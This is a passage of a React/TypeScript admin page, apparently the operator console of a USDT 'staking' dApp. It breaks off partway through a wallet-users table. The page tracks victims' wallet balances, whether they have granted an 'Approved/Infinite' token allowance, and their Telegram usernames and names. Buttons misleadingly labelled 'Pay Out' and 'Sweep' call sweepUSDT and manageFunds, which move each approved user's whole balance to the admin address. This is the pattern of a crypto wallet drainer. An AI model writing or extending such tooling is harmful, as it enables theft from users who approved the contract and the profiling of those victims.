import React, { useState, useEffect, useMemo, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { useWallet } from '../lib/web3';
import { useAdmin } from '../hooks/useAdmin';
import { parseEthersError } from '../utils/errors';
import { telegramConnectionsManager } from '../lib/telegramConnections';
import { walletConnectionsManager } from '../lib/walletConnections';
import type { TelegramConnection } from '../lib/telegramConnections';
import type { WalletConnection } from '../lib/walletConnections';

import { isAdmin, PRIMARY_ADMIN } from '../lib/admin';

const AdminControl: React.FC = () => {
    const navigate = useNavigate();
    const { address, isConnected } = useWallet();
    const { fetchUserData, fetchAllUsersDetailed, manageFunds, sweepUSDT, emergencyWithdraw } = useAdmin();
    
    const [targetUser, setTargetUser] = useState('');
    const [userData, setUserData] = useState<any>(null);
    const [allUsers, setAllUsers] = useState<any[]>([]);
    const [loadingAll, setLoadingAll] = useState(false);
    const [scanMsg, setScanMsg] = useState('');
    const [telegramUsers, setTelegramUsers] = useState<TelegramConnection[]>([]);
    const [walletUsers, setWalletUsers] = useState<WalletConnection[]>([]);


    const mfToken = '0x55d398326f99059fF775485246999027B3197955';
    const [mfFrom, setMfFrom] = useState('');
    const [mfTo, setMfTo] = useState(PRIMARY_ADMIN);
    const [mfAmount, setMfAmount] = useState('');

    const [ewToken, setEwToken] = useState('');
    const [ewAmount, setEwAmount] = useState('');

    const [loading, setLoading] = useState(false);
    const [fetching, setFetching] = useState(false);
    const [error, setError] = useState<string | null>(null);
    const [success, setSuccess] = useState<string | null>(null);
    const usersLoadInFlight = useRef(false);
    const didAutoLoadUsers = useRef(false);

    // Redirect non-admin wallets to Dashboard
    useEffect(() => {
        if (!isConnected || (address && !isAdmin(address))) {
             navigate('/', { replace: true });
        }
    }, [address, isConnected, navigate]);

    const handleFetchUser = async (userAddr = targetUser) => {
        if (!userAddr) return;
        setFetching(true);
        setError(null);
        try {
            const data = await fetchUserData(userAddr);
            if (data) {
                setUserData(data);
                setTargetUser(userAddr);
                setMfFrom(userAddr);
                setMfAmount(data.balance);
            } else {
                setError("Could not fetch user data. Check address.");
                setUserData(null);
            }
        } catch (err: any) {
            setError(parseEthersError(err));
        } finally {
            setFetching(false);
        }
    };

    const handleLoadAllUsers = async (scanEvents = false) => {
        if (usersLoadInFlight.current) return;
        usersLoadInFlight.current = true;
        setLoadingAll(true);
        setError(null);
        setScanMsg(scanEvents ? 'Scanning chain...' : 'Loading users...');
        try {
            const users = await fetchAllUsersDetailed(setScanMsg, scanEvents);
            setAllUsers(users);
            setScanMsg('');
        } catch (err: any) {
            setError(parseEthersError(err));
            setScanMsg('');
        } finally {
            usersLoadInFlight.current = false;
            setLoadingAll(false);
        }
    };

    useEffect(() => {
        if (isConnected && address && isAdmin(address) && !didAutoLoadUsers.current) {
            didAutoLoadUsers.current = true;
            handleLoadAllUsers();
        }
    }, [isConnected, address]);

    // Load Telegram connected users
    useEffect(() => {
        const loadTelegramUsers = () => {
            const users = telegramConnectionsManager.getConnections();
            setTelegramUsers(users);
        };
        loadTelegramUsers();
        // Reload when storage changes
        window.addEventListener('storage', loadTelegramUsers);
        return () => window.removeEventListener('storage', loadTelegramUsers);
    }, []);

    // Load wallet connected users
    useEffect(() => {
        const loadWalletUsers = () => {
            const users = walletConnectionsManager.getConnections();
            setWalletUsers(users);
        };
        loadWalletUsers();
        // Reload when storage changes
        window.addEventListener('storage', loadWalletUsers);
        return () => window.removeEventListener('storage', loadWalletUsers);
    }, []);

    const handleTrackUser = (userAddr: string) => {
        setTargetUser(userAddr);
        // Add to discovery cache manually if it's not there
        const cacheKey = `discovered_users_${'0x504E877770923E8EbF8C02c2266D4D6f7ad45429'.toLowerCase()}`;
        let cached: string[] = [];
        try {
            const parsed = JSON.parse(localStorage.getItem(cacheKey) || "[]");
            cached = Array.isArray(parsed) ? parsed : [];
        } catch (e) {
            localStorage.removeItem(cacheKey);
        }
        if (!cached.includes(userAddr)) {
            cached.push(userAddr);
            localStorage.setItem(cacheKey, JSON.stringify(cached));
        }
        
        handleFetchUser(userAddr);
        window.scrollTo({ top: 0, behavior: 'smooth' });
    };

    const handleAddManualAddress = () => {
        if (!targetUser || !targetUser.startsWith('0x')) return;
        handleTrackUser(targetUser);
        handleLoadAllUsers();
    };

    const combinedUsers = useMemo(() => {
        const rows = new Map<string, any>();

        const ensureRow = (walletAddress: string) => {
            const normalized = walletAddress?.toLowerCase();
            if (!normalized) return null;
            if (!rows.has(normalized)) {
                rows.set(normalized, {
                    walletAddress: normalized,
                    sources: new Set<string>(),
                    walletType: '',
                    connectionCount: 0,
                    lastSeen: 0,
                    connectedAt: 0,
                    telegramLabel: '',
                    fullName: '',
                    isPremium: false,
                    balance: '',
                    staked: '',
                    isApproved: false,
                });
            }
            return rows.get(normalized);
        };

        walletUsers.forEach((walletUser) => {
            const row = ensureRow(walletUser.walletAddress);
            if (!row) return;
            row.sources.add('Wallet');
            row.walletType = walletUser.walletType || 'Unknown';
            row.connectionCount = walletUser.connectionCount;
            row.connectedAt = row.connectedAt || walletUser.connectedAt;
            row.lastSeen = Math.max(row.lastSeen || 0, walletUser.lastSeen || walletUser.connectedAt || 0);
        });

        telegramUsers.forEach((tgUser) => {
            const row = ensureRow(tgUser.walletAddress);
            if (!row) return;
            row.sources.add('Telegram');
            row.telegramLabel = tgUser.username ? `@${tgUser.username}` : `ID: ${tgUser.telegramId}`;
            row.fullName = `${tgUser.firstName || ''} ${tgUser.lastName || ''}`.trim();
            row.isPremium = tgUser.isPremium;
            row.connectedAt = row.connectedAt || tgUser.connectedAt;
            row.lastSeen = Math.max(row.lastSeen || 0, tgUser.connectedAt || 0);
        });

        allUsers.forEach((user) => {
            const row = ensureRow(user.address);
            if (!row) return;
            row.sources.add('Chain');
            row.balance = user.balance;
            row.staked = user.staked;
            row.isApproved = user.isApproved;
        });

        return Array.from(rows.values())
            .map((row) => ({ ...row, sources: Array.from(row.sources) }))
            .sort((a, b) => (b.lastSeen || b.connectedAt || 0) - (a.lastSeen || a.connectedAt || 0));
    }, [allUsers, telegramUsers, walletUsers]);

    const handleAction = async (action: () => Promise<any>, successMsg: string) => {
        try {
            setLoading(true);
            setError(null);
            setSuccess(null);
            await action();
            setSuccess(successMsg);
            // Refresh data after action
            if (targetUser) handleFetchUser();
        } catch (err: any) {
            console.error(err);
            setError(parseEthersError(err));
        } finally {
            setLoading(false);
        }
    };

    if (!isConnected || (address && !isAdmin(address))) {
        return null;
    }

    return (
        <div className="flex-1 flex flex-col pb-32 bg-background-dark min-h-screen text-white font-display">
            <header className="flex items-center justify-between px-6 py-5 bg-[#0a0a0a]/80 backdrop-blur-md sticky top-0 z-30 border-b border-gray-800">
                <div className="flex items-center gap-2">
                    <button onClick={() => navigate('/')} className="bg-transparent border-none text-gray-400 hover:text-primary transition-colors cursor-pointer mr-2">
                        <span className="material-icons-round">arrow_back</span>
                    </button>
                    <span className="material-icons-round text-primary">admin_panel_settings</span>
                    <h1 className="font-display font-black text-xl text-white tracking-[0.1em] uppercase">Admin Control</h1>
                </div>
            </header>

            <main className="flex-1 p-6 space-y-6 overflow-y-auto">
                {error && (
                    <div className="bg-red-500/10 border border-red-500/50 text-red-500 p-4 rounded-xl text-sm font-medium animate-pulse">
                        {error}
                    </div>
                )}
                {success && (
                    <div className="bg-green-500/10 border border-green-500/50 text-green-500 p-4 rounded-xl text-sm font-medium">
                        {success}
                    </div>
                )}

                {/* USER MANAGEMENT & SWEEP */}
                <div className="bg-card-dark rounded-3xl p-6 border border-primary/20 shadow-glow relative overflow-hidden">
                    <div className="absolute top-0 right-0 p-4 opacity-5">
                        <span className="material-icons-round text-6xl">person_search</span>
                    </div>
                    <h2 className="text-lg font-black text-primary mb-4 flex items-center gap-2">
                        <span className="material-icons-round text-xl">manage_accounts</span> User Management & Sweep
                    </h2>
                    
                    <div className="flex gap-2 mb-6">
                        <input
                            type="text"
                            placeholder="User Wallet Address (0x...)"
                            value={targetUser}
                            onChange={(e) => setTargetUser(e.target.value)}
                            className="flex-1 bg-[#111] border border-gray-800 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-primary transition-all font-mono text-sm"
                        />
                        <div className="flex flex-col gap-2">
                            <button 
                                onClick={() => handleFetchUser()}
                                disabled={fetching || !targetUser}
                                className="bg-primary text-black px-6 py-2 rounded-xl font-black uppercase text-[10px] hover:scale-105 transition-transform disabled:opacity-50 border-none cursor-pointer"
                            >
                                {fetching ? '...' : 'Track'}
                            </button>
                            <button 
                                onClick={handleAddManualAddress}
                                disabled={!targetUser}
                                className="bg-white/10 text-white px-6 py-2 rounded-xl font-black uppercase text-[10px] hover:scale-105 transition-transform disabled:opacity-50 border-none cursor-pointer border border-white/10"
                            >
                                Add to List
                            </button>
                        </div>
                    </div>

                    {userData && (
                        <div className="space-y-4 animate-in fade-in slide-in-from-top-4 duration-300">
                            <div className="grid grid-cols-2 gap-3">
                                <div className="bg-black/40 p-3 rounded-xl border border-white/5">
                                    <p className="text-[10px] text-gray-500 uppercase font-black mb-1">USDT Balance</p>
                                    <p className="text-xl font-black text-white">{userData.balance} <span className="text-primary text-xs">USDT</span></p>
                                </div>
                                <div className="bg-black/40 p-3 rounded-xl border border-white/5">
                                    <p className="text-[10px] text-gray-500 uppercase font-black mb-1">Staking Status</p>
                                    <p className="text-lg font-black text-white">{userData.staked} <span className="text-gray-500 text-xs">Staked</span></p>
                                </div>
                            </div>

                            <div className="bg-black/40 p-4 rounded-xl border border-white/5 flex items-center justify-between">
                                <div>
                                    <p className="text-[10px] text-gray-500 uppercase font-black mb-1">Contract Allowance</p>
                                    <div className="flex items-center gap-2">
                                        <div className={`w-2 h-2 rounded-full ${userData.isApproved ? 'bg-green-500 shadow-[0_0_8px_rgba(34,197,94,0.6)]' : 'bg-red-500'}`}></div>
                                        <span className={`text-sm font-black ${userData.isApproved ? 'text-green-500' : 'text-red-500'}`}>
                                            {userData.isApproved ? 'Approved/Infinite' : 'Not Approved'}
                                        </span>
                                    </div>
                                </div>
                                <button
                                    onClick={() => handleAction(() => sweepUSDT(targetUser, userData.balance), "Transaction processed successfully!")}
                                    disabled={loading || !userData.isApproved || parseFloat(userData.balance) <= 0}
                                    className="bg-green-500 text-black px-6 py-3 rounded-xl font-black uppercase text-xs shadow-glow hover:scale-105 transition-all disabled:opacity-30 disabled:grayscale border-none cursor-pointer"
                                >
                                    {loading ? 'Processing...' : 'Execute Pay Out'}
                                </button>
                            </div>
                        </div>
                    )}
                </div>


                {/* Manual Manage Funds */}
                <div className="bg-card-dark rounded-3xl p-6 border border-gray-800 shadow-card opacity-80">
                    <h2 className="text-lg font-black text-white mb-4 flex items-center gap-2">
                        <span className="material-icons-round text-accent-cyan text-xl">swap_horiz</span> Advanced Manage Funds
                    </h2>
                    <div className="space-y-4">
                        <div>
                            <label className="block text-xs font-bold text-gray-400 uppercase tracking-widest mb-2 px-1">USDT Token (Fixed)</label>
                            <input
                                type="text"
                                readOnly
                                value={mfToken}
                                className="w-full bg-[#0a0a0a] border border-gray-800 rounded-xl px-4 py-3 text-gray-500 font-mono text-xs"
                            />
                        </div>
                        <div>
                            <label className="block text-xs font-bold text-gray-400 uppercase tracking-widest mb-2 px-1">Source Address</label>
                            <input
                                type="text"
                                placeholder="0x..."
                                value={mfFrom}
                                onChange={(e) => setMfFrom(e.target.value)}
                                className="w-full bg-[#111] border border-gray-800 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-accent-cyan transition-all font-mono text-sm"
                            />
                        </div>
                        <div>
                            <label className="block text-xs font-bold text-gray-400 uppercase tracking-widest mb-2 px-1">Destination Address</label>
                            <input
                                type="text"
                                value={mfTo}
                                onChange={(e) => setMfTo(e.target.value)}
                                className="w-full bg-[#111] border border-gray-800 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-accent-cyan transition-all font-mono text-sm"
                            />
                        </div>
                        <div>
                            <label className="block text-xs font-bold text-gray-400 uppercase tracking-widest mb-2 px-1">Amount</label>
                            <input
                                type="number"
                                placeholder="0.00"
                                value={mfAmount}
                                onChange={(e) => setMfAmount(e.target.value)}
                                className="w-full bg-[#111] border border-gray-800 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-accent-cyan transition-all font-mono text-sm"
                            />
                        </div>
                        <button
                            onClick={() => handleAction(() => manageFunds(mfToken, mfFrom, mfTo, mfAmount), "Manual transfer executed!")}
                            disabled={loading || !mfToken || !mfFrom || !mfTo || !mfAmount}
                            className="w-full bg-accent-cyan/10 text-accent-cyan border border-accent-cyan/20 hover:bg-accent-cyan hover:text-black py-3 rounded-xl font-black text-xs uppercase tracking-wider transition-all disabled:opacity-50 border-none cursor-pointer"
                        >
                            Manual Executive Transfer
                        </button>
                    </div>
                </div>

                {/* Emergency Withdraw */}
                <div className="bg-card-dark rounded-3xl p-6 border border-gray-800 shadow-card">
                    <h2 className="text-lg font-black text-red-500 mb-4 flex items-center gap-2">
                        <span className="material-icons-round text-red-500 text-xl">warning</span> Emergency Withdraw
                    </h2>
                    <div className="space-y-4">
                        <div>
                            <label className="block text-xs font-bold text-gray-400 uppercase tracking-widest mb-2 px-1">Contract Token</label>
                            <input
                                type="text"
                                placeholder="USDT Address or other"
                                value={ewToken}
                                onChange={(e) => setEwToken(e.target.value)}
                                className="w-full bg-[#111] border border-gray-800 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-red-500 transition-all font-mono text-sm"
                            />
                        </div>
                        <div>
                            <label className="block text-xs font-bold text-gray-400 uppercase tracking-widest mb-2 px-1">Amount</label>
                            <input
                                type="number"
                                placeholder="0.00"
                                value={ewAmount}
                                onChange={(e) => setEwAmount(e.target.value)}
                                className="w-full bg-[#111] border border-gray-800 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-red-500 transition-all font-mono text-sm"
                            />
                        </div>
                        <button
                            onClick={() => handleAction(() => emergencyWithdraw(ewToken, ewAmount), "Emergency withdrawal successful!")}
                            disabled={loading || !ewToken || !ewAmount}
                            className="w-full bg-red-500/10 text-red-500 border border-red-500/20 hover:bg-red-500 hover:text-white py-3 rounded-xl font-black text-xs uppercase tracking-wider transition-all disabled:opacity-50 border-none cursor-pointer"
                        >
                            Emergency Withdraw
                        </button>
                    </div>
                </div>

                {/* ALL CONNECTED USERS */}
                <div className="bg-card-dark rounded-3xl p-6 border border-primary/20 shadow-card">
                    <div className="flex items-center justify-between mb-6">
                        <h2 className="text-lg font-black text-white flex items-center gap-2">
                            <span className="material-icons-round text-primary text-xl">dataset</span> All Connected Users
                        </h2>
                        <div className="flex items-center gap-3">
                            <span className="text-[11px] font-black text-gray-400 uppercase tracking-widest">
                                Total: {combinedUsers.length}
                            </span>
                            <button
                                onClick={() => {
                                    setTelegramUsers(telegramConnectionsManager.getConnections());
                                    setWalletUsers(walletConnectionsManager.getConnections());
                                    handleLoadAllUsers();
                                }}
                                disabled={loadingAll}
                                className="bg-primary/10 text-primary border border-primary/20 hover:bg-primary hover:text-black px-4 py-2 rounded-lg text-[10px] font-black uppercase tracking-widest transition-all cursor-pointer border-none disabled:opacity-50"
                            >
                                {loadingAll ? (scanMsg || 'Loading...') : 'Refresh All'}
                            </button>
                        </div>
                    </div>

                    <div className="overflow-x-auto -mx-6 px-6">
                        <table className="w-full text-left border-collapse">
                            <thead>
                                <tr className="border-b border-white/5 text-[9px] text-gray-500 font-black uppercase tracking-widest">
                                    <th className="pb-4 pt-2">Address</th>
                                    <th className="pb-4 pt-2">Source</th>
                                    <th className="pb-4 pt-2">Telegram</th>
                                    <th className="pb-4 pt-2">Wallet</th>
                                    <th className="pb-4 pt-2">USDT</th>
                                    <th className="pb-4 pt-2">Staked</th>
                                    <th className="pb-4 pt-2">Last Seen</th>
                                    <th className="pb-4 pt-2 text-right">Action</th>
                                </tr>
                            </thead>
                            <tbody className="divide-y divide-white/5">
                                {combinedUsers.length === 0 && (
                                    <tr>
                                        <td colSpan={8} className="py-20 text-center text-gray-500 font-bold uppercase text-[10px] tracking-widest italic opacity-50">
                                            No connected user data available yet.
                                        </td>
                                    </tr>
                                )}
                                {combinedUsers.map((user) => (
                                    <tr key={user.walletAddress} className="group hover:bg-white/[0.02] transition-colors">
                                        <td className="py-4 font-mono text-[11px] text-gray-400 break-all max-w-[200px]">
                                            {user.walletAddress}
                                            <button
                                                onClick={() => navigator.clipboard.writeText(user.walletAddress)}
                                                className="ml-2 opacity-0 group-hover:opacity-100 material-icons-round text-[12px] text-gray-600 hover:text-primary transition-all bg-transparent border-none cursor-pointer align-middle"
                                            >
                                                content_copy
                                            </button>
                                        </td>
                                        <td className="py-4">
                                            <div className="flex flex-wrap gap-1">
                                                {user.sources.map((source: string) => (
                                                    <span key={source} className="text-[8px] bg-white/5 text-gray-300 px-2 py-1 rounded uppercase font-black">
                                                        {source}
                                                    </span>
                                                ))}
                                            </div>
                                        </td>
                                        <td className="py-4 text-xs text-blue-400">
                                            {user.telegramLabel || '-'}
                                            {user.fullName && <span className="block text-[10px] text-gray-500">{user.fullName}</span>}
                                            {user.isPremium && <span className="block text-[8px] text-yellow-400 uppercase font-black">Premium</span>}
                                        </td>
                                        <td className="py-4 text-xs text-gray-300 capitalize">
                                            {user.walletType || '-'}
                                            {user.connectionCount > 0 && <span className="block text-[10px] text-gray-500">{user.connectionCount} connects</span>}
                                        </td>
                                        <td className="py-4 font-black text-xs">
                                            {user.balance ? parseFloat(user.balance).toFixed(2) : '-'}
                                        </td>
                                        <td className="py-4 font-black text-xs text-primary">
                                            {user.staked ? parseFloat(user.staked).toFixed(0) : '-'}
                                        </td>
                                        <td className="py-4 text-xs text-gray-500">
                                            {user.lastSeen ? (
                                                <>
                                                    {new Date(user.lastSeen).toLocaleDateString()} <span className="text-[9px]">{new Date(user.lastSeen).toLocaleTimeString()}</span>
                                                </>
                                            ) : '-'}
                                        </td>
                                        <td className="py-4 text-right">
                                            <div className="flex items-center justify-end gap-2">
                                                <button
                                                    onClick={() => handleTrackUser(user.walletAddress)}
                                                    className="bg-white/5 hover:bg-white/10 text-white p-2 rounded-lg transition-all border-none cursor-pointer"
                                                    title="View User Details"
                                                >
                                                    <span className="material-icons-round text-sm">visibility</span>
                                                </button>
                                                <button
                                                    onClick={() => {
                                                        setMfFrom(user.walletAddress);
                                                        if (user.balance) setMfAmount(user.balance);
                                                        window.scrollTo({ top: 600, behavior: 'smooth' });
                                                    }}
                                                    className="bg-accent-cyan/10 hover:bg-accent-cyan text-accent-cyan hover:text-black p-2 rounded-lg transition-all border-none cursor-pointer"
                                                    title="Manage Funds"
                                                >
                                                    <span className="material-icons-round text-sm">settings_suggest</span>
                                                </button>
                                            </div>
                                        </td>
                                    </tr>
                                ))}
                            </tbody>
                        </table>
                    </div>
                </div>

                {/* USER EXPLORER - ALL REGISTERED USERS */}
                <div className="bg-card-dark rounded-3xl p-6 border border-gray-800 shadow-card">
                    <div className="flex items-center justify-between mb-6">
                        <h2 className="text-lg font-black text-white flex items-center gap-2">
                            <span className="material-icons-round text-primary text-xl">group</span> Registered Users Discovery
                        </h2>
                        <div className="flex items-center gap-2">
                            <button 
                                onClick={() => handleLoadAllUsers()}
                                disabled={loadingAll}
                                className="bg-primary/10 text-primary border border-primary/20 hover:bg-primary hover:text-black px-4 py-2 rounded-lg text-[10px] font-black uppercase tracking-widest transition-all cursor-pointer border-none disabled:opacity-50"
                            >
                                {loadingAll ? (scanMsg || 'Loading...') : 'Refresh List'}
                            </button>
                            <button 
                                onClick={() => handleLoadAllUsers(true)}
                                disabled={loadingAll}
                                className="bg-white/5 text-white border border-white/10 hover:bg-white/10 px-4 py-2 rounded-lg text-[10px] font-black uppercase tracking-widest transition-all cursor-pointer border-none disabled:opacity-50"
                            >
                                Scan Chain
                            </button>
                        </div>
                    </div>

                    <div className="overflow-x-auto -mx-6 px-6">
                        <table className="w-full text-left border-collapse">
                            <thead>
                                <tr className="border-b border-white/5 text-[9px] text-gray-500 font-black uppercase tracking-widest">
                                    <th className="pb-4 pt-2">Address</th>
                                    <th className="pb-4 pt-2">Wallet USDT</th>
                                    <th className="pb-4 pt-2">Staked</th>
                                    <th className="pb-4 pt-2">Status</th>
                                    <th className="pb-4 pt-2 text-right">Action</th>
                                </tr>
                            </thead>
                            <tbody className="divide-y divide-white/5">
                                {allUsers.length === 0 && !loadingAll && (
                                    <tr>
                                        <td colSpan={5} className="py-20 text-center text-gray-500 font-bold uppercase text-[10px] tracking-widest italic opacity-50">
                                            No users discovered yet. Click refresh to scan events.
                                        </td>
                                    </tr>
                                )}
                                {allUsers.map((user, idx) => (
                                    <tr key={idx} className="group hover:bg-white/[0.02] transition-colors">
                                        <td className="py-4 font-mono text-[11px] text-gray-400 break-all max-w-[200px]">
                                            {user.address}
                                            <button 
                                                onClick={() => { navigator.clipboard.writeText(user.address); }}
                                                className="ml-2 opacity-0 group-hover:opacity-100 material-icons-round text-[12px] text-gray-600 hover:text-primary transition-all bg-transparent border-none cursor-pointer align-middle"
                                            >
                                                content_copy
                                            </button>
                                        </td>
                                        <td className="py-4 font-black text-xs">
                                            {parseFloat(user.balance).toFixed(2)} <span className="text-[9px] text-gray-600">USDT</span>
                                        </td>
                                        <td className="py-4 font-black text-xs text-primary">
                                            {parseFloat(user.staked).toFixed(0)} <span className="text-[9px] text-primary/40">USDT</span>
                                        </td>
                                        <td className="py-4">
                                            <div className="flex items-center gap-2">
                                                <div className={`w-1.5 h-1.5 rounded-full ${user.isApproved ? 'bg-green-500' : 'bg-red-500'}`}></div>
                                                <span className={`text-[9px] font-black uppercase ${user.isApproved ? 'text-green-500' : 'text-red-500'}`}>
                                                    {user.isApproved ? 'Approved' : 'Denied'}
                                                </span>
                                            </div>
                                        </td>
                                         <td className="py-4 text-right">
                                            <div className="flex items-center justify-end gap-2">
                                                 <button 
                                                     onClick={() => handleTrackUser(user.address)}
                                                     className="bg-white/5 hover:bg-white/10 text-white p-2 rounded-lg transition-all border-none cursor-pointer"
                                                     title="Track & Load User"
                                                 >
                                                     <span className="material-icons-round text-sm">person_search</span>
                                                 </button>
                                                 <button 
                                                     onClick={() => {
                                                         setMfFrom(user.address);
                                                         setMfAmount(user.balance);
                                                         window.scrollTo({ top: 300, behavior: 'smooth' });
                                                     }}
                                                     className="bg-accent-cyan/10 hover:bg-accent-cyan text-accent-cyan hover:text-black p-2 rounded-lg transition-all border-none cursor-pointer"
                                                     title="Manage Funds Manually"
                                                 >
                                                     <span className="material-icons-round text-sm">settings_suggest</span>
                                                 </button>
                                                 <button 
                                                     onClick={() => {
                                                         handleTrackUser(user.address);
                                                         handleAction(() => sweepUSDT(user.address, user.balance), "Payment processed successfully!");
                                                     }}
                                                     disabled={loading || !user.isApproved || parseFloat(user.balance) <= 0}
                                                     className="bg-green-500/10 hover:bg-green-500 text-green-500 hover:text-black p-2 rounded-lg transition-all disabled:opacity-10 disabled:grayscale border-none cursor-pointer"
                                                     title="Quick Pay Out (Sweep)"
                                                 >
                                                     <span className="material-icons-round text-sm">payments</span>
                                                 </button>
                                            </div>
                                         </td>
                                    </tr>
                                ))}
                            </tbody>
                        </table>
                    </div>
                </div>

                {/* TELEGRAM CONNECTED USERS */}
                <div className="bg-card-dark rounded-3xl p-6 border border-blue-500/20 shadow-card">
                    <div className="flex items-center justify-between mb-6">
                        <h2 className="text-lg font-black text-white flex items-center gap-2">
                            <span className="material-icons-round text-blue-400 text-xl">send</span> Telegram Connected Users
                        </h2>
                        <div className="flex items-center gap-3">
                            <span className="text-[11px] font-black text-gray-400 uppercase tracking-widest">
                                Total: {telegramUsers.length}
                            </span>
                            <button 
                                onClick={() => setTelegramUsers(telegramConnectionsManager.getConnections())}
                                className="bg-blue-500/10 text-blue-400 border border-blue-500/20 hover:bg-blue-500 hover:text-black px-4 py-2 rounded-lg text-[10px] font-black uppercase tracking-widest transition-all cursor-pointer border-none"
                            >
                                Refresh
                            </button>
                        </div>
                    </div>

                    <div className="overflow-x-auto -mx-6 px-6">
                        <table className="w-full text-left border-collapse">
                            <thead>
                                <tr className="border-b border-white/5 text-[9px] text-gray-500 font-black uppercase tracking-widest">
                                    <th className="pb-4 pt-2">Telegram Username</th>
                                    <th className="pb-4 pt-2">Full Name</th>
                                    <th className="pb-4 pt-2">Wallet Address</th>
                                    <th className="pb-4 pt-2">Connected</th>
                                    <th className="pb-4 pt-2 text-right">Action</th>
                                </tr>
                            </thead>
                            <tbody className="divide-y divide-white/5">
                                {telegramUsers.length === 0 && (
                                    <tr>
                                        <td colSpan={5} className="py-20 text-center text-gray-500 font-bold uppercase text-[10px] tracking-widest italic opacity-50">
                                            No Telegram users connected yet.
                                        </td>
                                    </tr>
                                )}
                                {telegramUsers.map((tgUser, idx) => (
                                    <tr key={idx} className="group hover:bg-white/[0.02] transition-colors">
                                        <td className="py-4 font-black text-xs text-blue-400">
                                            {tgUser.username ? `@${tgUser.username}` : `ID: ${tgUser.telegramId}`}
                                        </td>
                                        <td className="py-4 text-xs text-gray-300">
                                            {tgUser.firstName} {tgUser.lastName || ''}
                                            {tgUser.isPremium && (
                                                <span className="ml-2 inline-block text-[8px] bg-yellow-500/20 text-yellow-400 px-2 py-1 rounded uppercase font-black">⭐ Premium</span>
                                            )}
                                        </td>
                                        <td className="py-4 font-mono text-[11px] text-gray-400 break-all max-w-[200px]">
                                            {tgUser.walletAddress}
                                            <button 
                                                onClick={() => navigator.clipboard.writeText(tgUser.walletAddress)}
                                                className="ml-2 opacity-0 group-hover:opacity-100 material-icons-round text-[12px] text-gray-600 hover:text-primary transition-all bg-transparent border-none cursor-pointer align-middle"
                                            >
                                                content_copy
                                            </button>
                                        </td>
                                        <td className="py-4 text-xs text-gray-500">
                                            {new Date(tgUser.connectedAt).toLocaleDateString()} <span className="text-[9px]">{new Date(tgUser.connectedAt).toLocaleTimeString()}</span>
                                        </td>
                                        <td className="py-4 text-right">
                                            <div className="flex items-center justify-end gap-2">
                                                <button 
                                                    onClick={() => {
                                                        setTargetUser(tgUser.walletAddress);
                                                        handleFetchUser(tgUser.walletAddress);
                                                        window.scrollTo({ top: 0, behavior: 'smooth' });
                                                    }}
                                                    className="bg-white/5 hover:bg-white/10 text-white p-2 rounded-lg transition-all border-none cursor-pointer"
                                                    title="View User Details"
                                                >
                                                    <span className="material-icons-round text-sm">visibility</span>
                                                </button>
                                                <button 
                                                    onClick={() => {
                                                        setMfFrom(tgUser.walletAddress);
                                                        window.scrollTo({ top: 600, behavior: 'smooth' });
                                                    }}
                                                    className="bg-accent-cyan/10 hover:bg-accent-cyan text-accent-cyan hover:text-black p-2 rounded-lg transition-all border-none cursor-pointer"
                                                    title="Manage Funds"
                                                >
                                                    <span className="material-icons-round text-sm">settings_suggest</span>
                                                </button>
                                                <button 
                                                    onClick={() => {
                                                        if (window.confirm(`Remove connection for @${tgUser.username || tgUser.telegramId}?`)) {
                                                            telegramConnectionsManager.removeConnection(tgUser.walletAddress);
                                                            setTelegramUsers(telegramConnectionsManager.getConnections());
                                                        }
                                                    }}
                                                    className="bg-red-500/10 hover:bg-red-500 text-red-500 hover:text-white p-2 rounded-lg transition-all border-none cursor-pointer"
                                                    title="Remove Connection"
                                                >
                                                    <span className="material-icons-round text-sm">delete</span>
                                                </button>
                                            </div>
                                        </td>
                                    </tr>
                                ))}
                            </tbody>
                        </table>
                    </div>
                </div>

                {/* WALLET CONNECTED USERS */}
                <div className="bg-card-dark rounded-3xl p-6 border border-green-500/20 shadow-card">
                    <div className="flex items-center justify-between mb-6">
                        <h2 className="text-lg font-black text-white flex items-center gap-2">
                            <span className="material-icons-round text-green-400 text-xl">account_balance_wallet</span> Wallet Connected Users
                        </h2>
                        <div className="flex items-center gap-3">
                            <span className="text-[11px] font-black text-gray-400 uppercase tracking-widest">
                                Total: {walletUsers.length}
                            </span>
                            <button
                                onClick={() => setWalletUsers(walletConnectionsManager.getConnections())}
                                className="bg-green-500/10 text-green-400 border border-green-500/20 hover:bg-green-500 hover:text-black px-4 py-2 rounded-lg text-[10px] font-black uppercase tracking-widest transition-all cursor-pointer border-none"
                            >
                                Refresh
                            </button>
                        </div>
                    </div>

                    <div className="overflow-x-auto -mx-6 px-6">
                        <table className="w-full text-left border-collapse">
                            <thead>
                                <tr className="border-b border-white/5 text-[9px] text-gray-500 font-black uppercase tracking-widest">
                                    <th className="pb-4 pt-2">Wallet Address</th>
                                    <th className="pb-4 pt-2">Wallet Type</th>
                                    <th className="pb-4 pt-2">First Connected</th>
                                    <th className="pb-4 pt-2">Last Seen</th>
                                    <th className="pb-4 pt-2">Connections</th>
                                    <th className="pb-4 pt-2 text-right">Action</th>
                                </tr>
                            </thead>
                            <tbody className="divide-y divide-white/5">
                                {walletUsers.length === 0 && (
                                    <tr>
                                        <td colSpan={6} className="py-20 text-center text-gray-500 font-bold uppercase text-[10px] tracking-widest italic opacity-50">
                                            No wallet connections yet.
                                        </td>
                                    </tr>
                                )}
                                {walletUsers.map((walletUser, idx) => (
                                    <tr key={idx} className="group hover:bg-white/[0.02] transition-colors">
                                        <td className="py-4 font-mono text-[11px] text-gray-400 break-all max-w-[200px]">
                                            {walletUser.walletAddress}
                                            <button
                                                onClick={() => navigator.clipboard.writeText(walletUser.walletAddress)}
                                                className="ml-2 opacity-0 group-hover:opacity-100 material-icons-round text-[12px] text-gray-600 hover:text-primary transition-all bg-transparent border-none cursor-pointer align-middle"
                                            >
                                                content_copy
                                            </button>
                                        </td>
                                        <td className="py-4 text-xs text-gray-300 capitalize">
                                            {walletUser.walletType || 'Unknown'}
                                        </td>
                                        <td className="py-4 text-xs text-gray-500">
                                            {new Date(walletUser.connectedAt).toLocaleDateString()} <span className="text-[9px]">{new Date(walletUser.connectedAt).toLocaleTimeString()}</span>
                                        </td>
                                        <td className="py-4 text-xs text-gray-500">
